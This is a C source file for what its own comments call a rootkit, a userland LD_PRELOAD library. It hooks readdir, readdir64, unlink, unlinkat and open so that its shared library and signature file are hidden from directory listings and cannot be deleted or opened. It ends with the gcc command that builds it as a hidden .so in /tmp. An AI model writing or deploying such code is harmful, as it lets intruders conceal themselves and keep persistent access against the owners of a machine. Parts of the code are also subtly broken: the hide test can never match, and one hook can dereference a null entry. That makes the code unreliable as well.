#include "ld_preload.h"
#include"rkconstant.h"

//hook readdir64 to hide file READDIR64
struct dirent *readdir64(DIR *dirp){
    struct dirent *(*my_readdir64)(DIR *dirp);
    my_readdir64 = dlsym(RTLD_NEXT,"readdir64");

    #ifdef DEBUG
        fprintf(stderr,"[*] Inside readdir64 function \n");
    #endif

    if(!my_readdir64)
        return NULL;

    struct dirent *entries;
    entries=my_readdir64(dirp);

    while(entries !=NULL){
        if(strcmp(entries->d_name,Shared_Lib_Path)== 0 && 
        strcmp(entries->d_name,SIGNATURE_FILE) == 0  && sig_check() != -1){

            entries=my_readdir64(dirp);
        } 
        else {
            return entries;
        }
    }

}
//prevent user removal of rootkit
int unlink(const char *path){
    int (*my_unlink)(const char *path);
    my_unlink = dlsym(RTLD_NEXT,"unlink");

    #ifdef DEBUG
        fprintf(stderr,"Inside unlink function");
    #endif

    if(!my_unlink){
        return -1 ;
    }
    //prevent deletion of undeleteable file
    if(strcmp(path,SIGNATURE_PATH) == 0){
        return -1;
    }
    return my_unlink(path);
}

int unlinkat(int dirfd, const char *path,int flags){
    int (*my_unlinkat)(int dirfd, const char *path,int flag);
    my_unlinkat =dlsym(RTLD_NEXT,"unlinkat");

    #ifdef DEBUG
        fprintf(stderr, "inside unlinkat function \n");
    #endif

    if(!my_unlinkat){
        return -1;
    }
    if(strcmp(path,SIGNATURE_PATH)== 0){
        return -1;
    }
    return my_unlinkat(dirfd,path,flags);
}


//hide directories entries READDIR64
struct dirent *readdir(DIR *dirp){
    struct dirent *(*my_readdir)(DIR *dirp);
    my_readdir =dlsym(RTLD_NEXT,"readdir");

    #ifdef DEBUG
        fprintf(stderr,"[*] Inside readdir function \n");
    #endif

    if(!my_readdir)
        return NULL;

    struct dirent *entry;
    entry = my_readdir(dirp);
     if(strcmp(entry->d_name,Shared_Lib_Path)== 0 && 
        strcmp(entry->d_name,SIGNATURE_FILE) == 0  && sig_check() != -1){
        entry=my_readdir(dirp);        
    }
    return entry;


}
//hide file from being opened
int open(const char *pathname, int flags, ...){
    int (*my_open)(const char *pathname, int flags, ...);
    my_open = dlsym(RTLD_NEXT,"open");
    
    #ifdef DEBUG
        fprintf(stderr,"[*] Inside open function \n");
    #endif

    //hide file named root_test
    if(strstr(pathname,SIGNATURE_PATH)){
        return -1;
    }
    return my_open(pathname,flags);
}
//compile to to a shared object 
//gcc hide.c process_hider.c check_for_signature.c loadenv.c -o /tmp/.MY_ROOTKIT.so 